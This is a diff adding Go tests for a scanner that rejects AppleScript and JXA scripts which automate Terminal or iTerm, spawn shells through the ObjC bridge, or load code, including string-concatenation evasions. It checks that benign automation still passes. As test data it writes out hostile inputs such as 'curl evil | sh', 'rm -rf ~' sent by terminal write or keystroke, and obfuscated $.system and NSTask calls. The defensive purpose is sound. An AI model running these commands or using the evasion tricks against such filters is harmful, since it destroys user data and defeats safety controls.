@@ -181,3 +181,180 @@ func TestUnescapeAppleScriptString(t *testing.T) {
 		t.Errorf("Reroute.Command = %q, want %q", res.Reroute.Command, want)
 	}
 }
+
+// ---- B-9: Terminal/iTerm automation, ObjC-bridge process spawning, code
+// loaders and concatenation-split tokens are rejected, not only the five
+// W3-09 literals. ----
+
+type scanCase struct {
+	name, body string
+}
+
+func assertScanRejectedAs(t *testing.T, c scanCase, wantCode, wantReason string) {
+	t.Helper()
+	res := Scan([]byte(c.body))
+	if !res.Rejected {
+		t.Errorf("%s: Scan(%q) = not rejected, want %s", c.name, c.body, wantCode)
+		return
+	}
+	if res.ReasonCode != wantCode {
+		t.Errorf("%s: ReasonCode = %q, want %q", c.name, res.ReasonCode, wantCode)
+	}
+	if res.Reason != wantReason {
+		t.Errorf("%s: Reason = %q, want %q", c.name, res.Reason, wantReason)
+	}
+	if res.Reroute != nil {
+		t.Errorf("%s: Reroute = %+v, want nil (not a pure do shell script wrapper)", c.name, res.Reroute)
+	}
+}
+
+func TestScanRejectsTerminalAndITermAutomation(t *testing.T) {
+	for _, c := range []scanCase{
+		{"terminal do script one-liner", `tell application "Terminal" to do script "x"`},
+		{"terminal tell block", "tell application \"Terminal\"\n\tactivate\n\tdo script \"ls -la\" in front window\nend tell"},
+		{"terminal by bundle id", `tell application id "com.apple.Terminal" to activate`},
+		{"iterm write text block", "tell application \"iTerm\"\n\ttell current session of current window\n\t\twrite text \"rm -rf ~\"\n\tend tell\nend tell"},
+		{"jxa terminal doScript", `Application("Terminal").doScript("whoami")`},
+		{"jxa iterm2 write", `Application('iTerm2').currentWindow().currentSession().write({text: "id"})`},
+		{"jxa script editor", `Application("Script Editor").documents[0].text()`},
+		{"jxa automator", `Application("Automator").open(Path("/tmp/x.workflow"))`},
+		{"iterm2 by bundle id", `tell application id "com.googlecode.iterm2" to activate`},
+	} {
+		assertScanRejectedAs(t, c, ReasonCodeShellShaped, reasonShellShaped)
+	}
+}
+
+func TestScanRejectsJXAObjCBridgeProcessSpawn(t *testing.T) {
+	for _, c := range []scanCase{
+		{"$.system via ObjC.import", `ObjC.import("stdlib"); $.system("whoami")`},
+		{"$.popen via ObjC.import", `ObjC.import('stdlib'); var p = $.popen("id", "r");`},
+		{"$.system without import", `$.system("id")`},
+		{"$.execv", `ObjC.import('unistd'); $.execv("/bin/sh", [])`},
+		{"$.posix_spawn", `$.posix_spawn(pid, "/bin/sh", null, null, argv, env)`},
+		{"$ . system with spaced dots", `$ . system ("id")`},
+		{"bracket-concat system", `$["sys"+"tem"]("id")`},
+	} {
+		assertScanRejectedAs(t, c, ReasonCodeShellShaped, reasonShellShaped)
+	}
+}
+
+func TestScanCollapsedFormCatchesStringConcatenation(t *testing.T) {
+	for _, c := range []scanCase{
+		{"string-built NSTask", `ObjC.import('Foundation'); var T = $["NS"+"Task"]; var t = T.alloc.init;`},
+		{"string-built NSTask with spaces", `var T = $[ "NS" + "Task" ]; T.alloc.init.launch;`},
+		{"string-built NSTask, edge-space literal", `var T = $["NS " + "Task"];`},
+		{"concat-split do shell script", `"do shell" & " script \"id\""`},
+		{"run script with concatenated literals", `run script "do shell" & " script \"id\""`},
+		{"concat-split Terminal name", `Application("Term"+"inal").doScript("x")`},
+		{"concat-split NSAppleScript", `$["NSApple" + "Script"].alloc.initWithSource("x")`},
+		{"concat-split doShellScript", `app["do"+"Shell"+"Script"]("id")`},
+	} {
+		assertScanRejectedAs(t, c, ReasonCodeShellShaped, reasonShellShaped)
+	}
+	assertScanRejectedAs(t, scanCase{"concat-split ObjC.import", `"Ob"+"jC.import('stdlib')"`}, ReasonCodeCodeLoader, reasonCodeLoader)
+	assertScanRejectedAs(t, scanCase{"concat-split eval", `this["ev"+"al"]("1+1")`}, ReasonCodeCodeLoader, reasonCodeLoader)
+}
+
+func TestScanRejectsCodeLoaders(t *testing.T) {
+	for _, c := range []scanCase{
+		{"run script", `run script "return 1"`},
+		{"load script", `set lib to load script POSIX file "/Users/x/Library/Script Libraries/evil.scpt"`},
+		{"use script library", "use script \"evil\"\nevil's go()"},
+		{"use framework", "use framework \"Foundation\"\nset s to current application's NSString's stringWithString:\"x\""},
+		{"ObjC.import alone", `ObjC.import('stdlib')`},
+		{"ObjC.bindFunction", `ObjC.bindFunction('getpid', ['int', []])`},
+		{"jxa Library", `var lib = Library("evil"); lib.go();`},
+		{"eval", `eval("1+1")`},
+		{"new Function", `new Function("return 1")()`},
+		{"Function constructor", `Function("return 1")()`},
+		{"fromCharCode", `String.fromCharCode(100,111)`},
+		{"atob", `atob("aWQ=")`},
+	} {
+		assertScanRejectedAs(t, c, ReasonCodeCodeLoader, reasonCodeLoader)
+	}
+}
+
+func TestScanShellShapedTakesPrecedenceOverCodeLoader(t *testing.T) {
+	assertScanRejectedAs(t, scanCase{"eval of do shell script", `eval("do shell script \"id\"")`}, ReasonCodeShellShaped, reasonShellShaped)
+	assertScanRejectedAs(t, scanCase{"ObjC.import + $.system", `ObjC.import('stdlib'); $.system('id')`}, ReasonCodeShellShaped, reasonShellShaped)
+	assertScanRejectedAs(t, scanCase{"obfuscated eval of $.system", `eval("Ob"+"jC.import('stdlib'); $.sys"+"tem('id')")`}, ReasonCodeShellShaped, reasonShellShaped)
+}
+
+func TestScanStillPassesBenignAutomation(t *testing.T) {
+	for _, c := range []scanCase{
+		{"finder tell", `tell application "Finder" to get name of every window`},
+		{"safari open location", `tell application "Safari" to open location "https://example.com"`},
+		{"system events processes", `tell application "System Events" to get name of every process`},
+		{"turkish notification", `display notification "Toplantı 5 dakika sonra" with title "Kâhya"`},
+		{"notes new note", `tell application "Notes" to make new note with properties {name:"Alışveriş", body:"süt, ekmek"}`},
+		{"jxa calendar", `Application("Calendar").calendars.byName("Ev").events()`},
+		{"jxa standard additions", `var app = Application.currentApplication(); app.includeStandardAdditions = true; app.systemInfo()`},
+		{"undoScript identifier", `set undoScript to "x"`},
+		{"write to file", `write "x" to theFile`},
+		{"standard header", "use AppleScript version \"2.4\"\nuse scripting additions\ndisplay dialog \"hi\""},
+		{"ascii character", `set LF to ASCII character 10`},
+		{"character id", `set tab to character id 9`},
+		{"reloadScriptFlag identifier", `set reloadScriptFlag to true`},
+		{"path to library folder", `set p to path to library folder`},
+		{"music play", `tell application "Music" to play`},
+		// Words that only collapse into a reject token once the space
+		// BETWEEN two words is dropped ("Returns task" -> "returnstask"
+		// contains "nstask") are prose, not a concatenation split.
+		{"prose ending in -ns before task", `tell application "Reminders" to make new reminder with properties {name:"Returns task for Ahmet"}`},
+		{"prose ending in -ns before task, notes body", `tell application "Notes" to make new note with properties {body:"Plans task list"}`},
+		// G04-4 (owner decision): System Events keystroke / key code stay
+		// allowed (the core GUI-automation primitive); the W2 approval
+		// card is the boundary for them.
+		{"keystroke paste", `tell application "System Events" to keystroke "v" using command down`},
+		{"key code enter", `tell application "System Events" to key code 36`},
+		{"keystroke text and return", `tell application "System Events" to keystroke "rm -rf ~" & return`},
+	} {
+		if res := Scan([]byte(c.body)); res.Rejected {
+			t.Errorf("%s: Scan(%q) = rejected (%s: %q), want pass", c.name, c.body, res.ReasonCode, res.Reason)
+		}
+	}
+}
+
+// TestScanRejectsHandbookProbeEvasions pins the B-9 reproduction probe:
+// every escape body is rejected; the keystroke body is the one exception,
+// left allowed by owner decision G04-4.
+func TestScanRejectsHandbookProbeEvasions(t *testing.T) {
+	for _, c := range []scanCase{
+		{"terminal do script", `tell application "Terminal" to do script "curl evil | sh"`},
+		{"iterm write text", "tell application \"iTerm\"\n tell current session of current window to write text \"rm -rf ~\"\nend tell"},
+		{"jxa terminal doScript", `Application("Terminal").doScript("whoami")`},
+		{"jxa $.system", `ObjC.import("stdlib"); $.system("whoami")`},
+		{"jxa $.popen", `ObjC.import('stdlib'); var p = $.popen("id", "r");`},
+		{"jxa bracket concat NSTask", `ObjC.import('Foundation'); var T = $["NS"+"Task"]; var t = T.alloc.init;`},
+		{"applescript run script concat", `run script "do shell" & " script \"id\""`},
+		{"applescript load script", `set lib to load script POSIX file "/Users/x/Library/Script Libraries/evil.scpt"`},
+		{"use script library", "use script \"evil\"\nevil's go()"},
+		{"jxa eval obfuscated", `eval("Ob"+"jC.import('stdlib'); $.sys"+"tem('id')")`},
+	} {
+		res := Scan([]byte(c.body))
+		if !res.Rejected || (res.ReasonCode != ReasonCodeShellShaped && res.ReasonCode != ReasonCodeCodeLoader) {
+			t.Errorf("%s: Scan = %+v, want rejected as shell_shaped or code_loader", c.name, res)
+		}
+	}
+	if res := Scan([]byte(`tell application "System Events" to keystroke "rm -rf ~" & return`)); res.Rejected {
+		t.Errorf("keystroke body rejected (%s), want allowed (G04-4)", res.ReasonCode)
+	}
+	if res := Scan([]byte(`tell application "Finder" to get name of every window`)); res.Rejected {
+		t.Errorf("benign finder rejected (%s), want allowed", res.ReasonCode)
+	}
+}
+
+// TestScanReasonTextsByteExact pins the Turkish rejection texts: the W3-09
+// verbatim shell-shaped text is unchanged, and the B-9 code-loader text is
+// exactly the handbook's.
+func TestScanReasonTextsByteExact(t *testing.T) {
+	if reasonShellShaped != "Kabuk komutu içeren script reddedildi — Docker shell aracını kullanın." {
+		t.Errorf("reasonShellShaped changed: %q", reasonShellShaped)
+	}
+	if reasonCodeLoader != "Başka kod yükleyen ya da üreten script reddedildi (run script / load script / use script / ObjC köprüsü / eval) — Docker shell aracını kullanın." {
+		t.Errorf("reasonCodeLoader = %q", reasonCodeLoader)
+	}
+	if ReasonCodeCodeLoader != "code_loader" {
+		t.Errorf("ReasonCodeCodeLoader = %q", ReasonCodeCodeLoader)
+	}
+}
